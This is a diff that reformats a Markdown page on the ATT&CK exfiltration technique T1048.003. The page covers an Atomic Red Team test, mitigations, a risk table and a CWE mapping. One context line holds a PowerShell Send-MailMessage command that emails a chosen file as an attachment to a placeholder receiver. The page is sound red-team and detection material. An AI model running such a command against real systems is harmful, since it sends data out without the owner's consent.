@@ -126,7 +126,6 @@ Upon successful execution, powershell will send an email with attached file to e
 Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -140,35 +139,36 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1031 Network Intrusion Prevention
+
 Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.
 
 ### M1057 Data Loss Prevention
+
 Data loss prevention can detect and block sensitive data being sent over unencrypted protocols.
 
 ### M1037 Filter Network Traffic
+
 Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.
 
 ### M1030 Network Segmentation
-Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.
 
+Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.
 
 ## Detection
 
 ### Detection of Exfiltration Over Unencrypted Non-C2 Protocol
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Exfiltration Over Unencrypted Non-C2 Protocol technique applicable | Medium | Exfiltration |
+| Finding                                                            | Severity | Impact       |
+| ------------------------------------------------------------------ | -------- | ------------ |
+| Exfiltration Over Unencrypted Non-C2 Protocol technique applicable | Medium   | Exfiltration |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                             |
+| ------- | --------------------------------- |
 | CWE-200 | Exposure of Sensitive Information |
-
 
 ## References
 
